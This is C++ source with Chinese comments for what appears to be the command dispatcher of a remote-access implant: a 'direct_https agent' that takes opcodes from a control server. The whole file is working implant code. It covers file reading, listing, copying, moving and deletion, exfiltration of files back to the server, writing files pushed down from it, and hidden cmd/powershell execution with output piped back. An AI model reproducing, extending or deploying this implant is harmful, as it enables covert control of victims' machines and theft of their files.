// 文件作用：命令分发器实现：把服务端下发的 opcode 分派到 hello、目录、文件、进程等命令处理函数。
#include "Commander.h"

// Commander::operator new 使用本项目的内存分配函数创建命令分发器。
void* Commander::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// Commander::operator delete 释放命令分发器占用的本地内存。
void Commander::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Commander));
}

// Commander 构造函数保存 Agent 指针，方便命令处理时访问配置和状态。
Commander::Commander(Agent* a)
{
	this->agent = a;
}

// ProcessCommandTasks 解析服务端下发的任务包，并按 command id 调用对应命令函数。
void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacker)
{
	if (recvSize < 8)
		return;

	Packer* inPacker = new Packer(recv, recvSize);

	ULONG packerSize = inPacker->Unpack32();
	if (packerSize > recvSize - 4) {
		delete inPacker;
		return;
	}

	while (inPacker->datasize() < packerSize + 4)
	{	
		ULONG CommandId = inPacker->Unpack32();
		switch (CommandId)
		{
		// 恢复学习版最小功能面：hello、cmd/powershell、文件 CRUD、upload/download。
		// jobs kill / terminate / disks 等非目标功能仍不暴露、不分发。
		case COMMAND_CAT:
			this->CmdCat(CommandId, inPacker, outPacker); break;
		case COMMAND_CD:
			this->CmdCd(CommandId, inPacker, outPacker); break;
		case COMMAND_CP:
			this->CmdCp(CommandId, inPacker, outPacker); break;
		case COMMAND_DOWNLOAD:
			this->CmdDownload(CommandId, inPacker, outPacker); break;
		case COMMAND_HELLO:
			this->CmdHello(CommandId, inPacker, outPacker); break;
		case COMMAND_LS:
			this->CmdLs(CommandId, inPacker, outPacker); break;
		case COMMAND_MV:
			this->CmdMv(CommandId, inPacker, outPacker); break;
		case COMMAND_MKDIR:
			this->CmdMkdir(CommandId, inPacker, outPacker); break;
		case COMMAND_PS_RUN:
			this->CmdPsRun(CommandId, inPacker, outPacker); break;
		case COMMAND_PWD:
			this->CmdPwd(CommandId, inPacker, outPacker); break;
		case COMMAND_RM:
			this->CmdRm(CommandId, inPacker, outPacker); break;
		case COMMAND_UPLOAD:
			this->CmdUpload(CommandId, inPacker, outPacker); break;
		case COMMAND_SAVEMEMORY:
			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
		default: break;
		}
	}
	if (inPacker)
		delete inPacker;
}

// CmdCat 读取指定文件内容，并把结果打包回传。
void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
		return;
	}

	DWORD contentSize = 2048;
	DWORD readed = 0;
	PVOID content = MemAllocLocal(contentSize);

	BOOL result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
		outPacker->PackBytes((PBYTE)content, readed);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}

	if (hFile) {
		ApiNt->NtClose(hFile);
		hFile = NULL;
	}

	if (content)
		MemFreeLocal(&content, contentSize);
}

// CmdCd 切换 agent 当前工作目录。
void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*) inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		CHAR  currentPath[MAX_PATH] = { 0 };
		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)currentPath, currentPathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdCp 复制文件。
void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*) inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*) inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
	if (result) {
		outPacker->Pack32(commandId);
	}      
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdDownload 打开文件并创建下载任务，后续由 Downloader 分块回传。
void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = (CHAR*) inPacker->UnpackBytes(&filenameSize);
	ULONG taskId       = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSizeHigh = 0;
		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;

		if (pathSize > 0) {
			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
			outPacker->Pack32(COMMAND_DOWNLOAD);
			outPacker->Pack32(downloadData.fileId);
			outPacker->Pack8(DOWNLOAD_START);
			outPacker->Pack64(downloadData.fileSize);
			outPacker->PackBytes((PBYTE)fullPath, pathSize);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}
	}
}

// CmdHello 返回一段简单文本，用来验证 agent 命令链路是否通。
void Commander::CmdHello(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = inPacker->Unpack32();
	const CHAR message[] = "hello from rewritten direct_https agent";

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);
	outPacker->PackBytes((PBYTE)message, sizeof(message) - 1);
}

// CmdJobsKill 根据 job id 终止正在运行的后台任务。
void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG jobId = inPacker->Unpack32();
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	BOOL found = FALSE;
	ULONG count = agent->jober->jobs.size();
	for (int i = 0; i < count; i++) {
		if (jobId == agent->jober->jobs[i].jobId) {
			agent->jober->jobs[i].jobState = JOB_STATE_KILLED;
			found = TRUE;
			break;
		}
	}

	outPacker->Pack8(found);
	outPacker->Pack32(jobId);
}

// CmdLs 枚举目录文件，并把名称、大小、时间和属性打包给服务端。
void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	CHAR  fullpath[MAX_PATH];
	DWORD fullpathSize = MAX_PATH;

	if (pathSize == 3 && path[1] == ':') {
		fullpath[0] = path[0];
		fullpath[1] = path[1];
		fullpathSize = 2;
	}
	else {
		fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
		if (fullpathSize + 2 > MAX_PATH || fullpathSize == 0) {
			outPacker->Pack8(FALSE);
			outPacker->Pack32(TEB->LastErrorValue);
			return;
		}
	}

	DWORD fileAttribs = ApiWin->GetFileAttributesA(fullpath);
	BOOL isFile = (fileAttribs != INVALID_FILE_ATTRIBUTES) && !(fileAttribs & FILE_ATTRIBUTE_DIRECTORY);
	if (!isFile) {
		fullpath[fullpathSize] = '\\';
		fullpath[++fullpathSize] = '*';
		fullpath[++fullpathSize] = 0;
	}

	WIN32_FIND_DATAA findData = { 0 };
	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
	if ( File != INVALID_HANDLE_VALUE ) {
		outPacker->Pack8(TRUE);
		outPacker->PackStringA(fullpath);

		ULONG count = 0;
		ULONG indexCount = outPacker->datasize();
		outPacker->Pack32(0);

		do {
			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
			
			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
				continue;
			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
				continue;
			
			ULONG64 size = 0;
			((ULONG*)&size)[1] = findData.nFileSizeHigh;
			((ULONG*)&size)[0] = findData.nFileSizeLow;

			ULONG writeDate = FileTimeToUnixTimestamp(findData.ftLastWriteTime);

			outPacker->Pack8(isDir);
			outPacker->Pack64(size);
			outPacker->Pack32(writeDate);
			outPacker->PackStringA(findData.cFileName);

			count++;

		} while (!isFile && ApiWin->FindNextFileA(File, &findData));
		ApiWin->FindClose(File);
		outPacker->Set32(indexCount, count);
	}
	else {
		outPacker->Pack8(FALSE);
		outPacker->Pack32(TEB->LastErrorValue);
	}

}

// CmdMkdir 创建目录。
void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CreateDirectoryA(path, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdMv 移动或重命名文件。
void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*)inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*)inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->MoveFileA(src, dst);
	if (result) {
		outPacker->Pack32(commandId);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdPsRun 启动 cmd/powershell 等子进程，并通过管道收集输出。
void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	BOOL  progOutput   = inPacker->Unpack8();
	BOOL  useToken     = inPacker->Unpack8();
	ULONG progState    = inPacker->Unpack32();
	ULONG progArgsSize = 0;
	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
	ULONG taskId       = inPacker->Unpack32();

	PROCESS_INFORMATION pi  = { 0 };
	STARTUPINFOA        spi = { 0 };
	spi.cb          = sizeof(STARTUPINFOA);
	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	spi.wShowWindow = SW_HIDE;

	HANDLE pipeRead  = NULL;
	HANDLE pipeWrite = NULL;
	if (progOutput) {
		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
		
		spi.hStdError  = pipeWrite;
		spi.hStdOutput = pipeWrite;
		spi.hStdInput  = NULL;
	}

	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);

	if (result) {
		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);

		outPacker->Pack32(taskId);
		outPacker->Pack32(commandId);
		outPacker->Pack32(job.pidObject);
		outPacker->Pack8(progOutput);
		outPacker->PackBytes((PBYTE)progArgs, progArgsSize);

		ApiNt->NtClose(pi.hThread);
		pi.hThread = NULL;
		if (!progOutput) {
			ApiNt->NtClose(pi.hProcess);
			pi.hProcess = NULL;
		}
	}
	else {
		if (pipeRead) {
			ApiNt->NtClose(pipeRead);
			pipeRead = NULL;
		}

		if (pipeWrite) {
			ApiNt->NtClose(pipeWrite);
			pipeWrite = NULL;
		}

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdPwd 返回 agent 当前工作目录。
void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	if (pathSize) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdRm 删除文件或目录。
void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);

	BOOL result = FALSE;
	BOOL directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

	if ( directory )
		result = ApiWin->RemoveDirectoryA(path);
	else
		result = ApiWin->DeleteFileA(path);

	if (result) {
		outPacker->Pack32(commandId);
		outPacker->Pack8(directory);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdTerminate 让 agent 主循环停止，准备退出。
void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	agent->config->exit_method  = inPacker->Unpack32();
	agent->config->exit_task_id = inPacker->Unpack32();
	agent->Active = FALSE;
}

// CmdUpload 接收服务端发来的文件内容并写入本地文件。
void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId = inPacker->Unpack32();
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();
	
	outPacker->Pack32(taskId);

	if ( !agent->memorysaver->chunks.contains(memoryId) )
		return;

	MemoryData memData = agent->memorysaver->chunks[memoryId];
	if (memData.complete) {

		BOOL  result  = false;
		DWORD written = 0;

		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);

		if (result) {
			outPacker->Pack32(COMMAND_UPLOAD);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
	agent->memorysaver->RemoveMemoryData(memoryId);
}

// CmdSaveMemory 保存一片内存数据，供后续多片拼接或任务使用。
void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId   = inPacker->Unpack32();
	ULONG totalSize  = inPacker->Unpack32();
	ULONG bufferSize = 0;
	BYTE* buffer     = inPacker->UnpackBytes(&bufferSize);
	ULONG taskId     = inPacker->Unpack32();

	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
}

// Exit 把 agent 标记为不活跃，并打包一个结束响应。
void Commander::Exit(Packer* outPacker)
{
	outPacker->Pack32(agent->config->exit_task_id);
	outPacker->Pack32(COMMAND_TERMINATE);
	outPacker->Pack32(agent->config->exit_method);
}
